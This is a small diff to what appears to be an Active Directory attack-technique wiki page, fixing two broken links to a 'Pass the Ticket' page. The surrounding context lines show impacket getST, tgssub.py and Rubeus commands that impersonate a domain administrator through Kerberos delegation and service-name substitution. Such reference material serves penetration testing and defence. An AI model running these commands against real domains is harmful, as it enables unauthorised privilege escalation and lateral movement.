@@ -49,7 +49,7 @@ getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:password
 tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
 ```
 
-Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](broken-reference) to access the target.
+Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](ptt.md) to access the target.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -74,7 +74,7 @@ Rubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"administrator" 
 Rubeus.exe tgssub /nowrap /altservice:"host/serverC" /ticket:"ba64ticket"
 ```
 
-Once the final service ticket is obtained, it can be used with [Pass the Ticket](broken-reference) to access the target.
+Once the final service ticket is obtained, it can be used with [Pass the Ticket](ptt.md) to access the target.
 {% endtab %}
 {% endtabs %}
 
